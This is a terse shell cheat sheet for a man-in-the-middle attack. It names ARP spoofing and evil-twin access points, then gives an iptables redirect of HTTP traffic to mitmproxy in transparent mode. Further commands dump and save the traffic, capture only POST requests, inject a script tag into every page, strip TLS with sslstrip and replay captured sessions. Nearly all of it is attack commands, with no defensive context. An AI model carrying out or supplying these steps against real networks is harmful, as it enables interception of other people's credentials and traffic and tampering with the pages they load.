# somehow become the mitm
# - arp spoof
# - evil twin
# - exploit router

# redirect http traffic to the proxy
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# dump the traffic
mitmdump --mode transparent -l 8080

# modify the traffic first
mitmdump --mode transparent --replace :~s:"</body>":"<script>alert('hehe :)');</script></body>"

# use custom scripts
# see https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex
mitmdump --mode transparent -s /some/script.py
mitmdump --mode transparent -s sslstrip.py

# save the traffic
mitmdump --mode transparent -w outfile

# filter the traffic
# only intercept post requests
mitmdump --mode transparent "~m post"

# visualize the traffic
mitmweb --mode tranparent

# client replay (!)
mitmdump -nc outfile

# clean / reset the iptables etc
